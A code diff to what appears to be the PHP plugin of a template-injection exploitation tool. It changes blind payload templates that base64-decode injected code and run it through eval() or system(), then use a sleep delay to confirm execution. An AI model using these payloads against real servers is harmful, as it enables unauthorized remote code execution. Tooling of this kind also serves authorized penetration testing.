@@ -41,8 +41,9 @@ class Php_generic(php.Php):
                 'evaluate_blind': """php -r '$d="{code_b64}";1 / (true && eval("return (" . base64_decode(str_pad(strtr($d, "-_", "+/"), strlen($d)%4,"=",STR_PAD_RIGHT)) . ");"));'""",
             },
             'evaluate_blind': {
-                'call': 'inject',
-                'execute_blind': """system(join("", [base64_decode(str_pad(strtr('{code_b64}', '-_', '+/'), strlen('{code_b64}')%4,'=',STR_PAD_RIGHT)), " && sleep {delay}"]))"""
+                # Dirty hack from Twig
+                'call': 'execute_blind',
+                'evaluate_blind': """php -r '$d="{code_b64}";eval("return (" . base64_decode(str_pad(strtr($d, "-_", "+/"), strlen($d)%4,"=",STR_PAD_RIGHT)) . ") && sleep({delay});");'""",
             },
             'execute': {
                 'call': 'render',
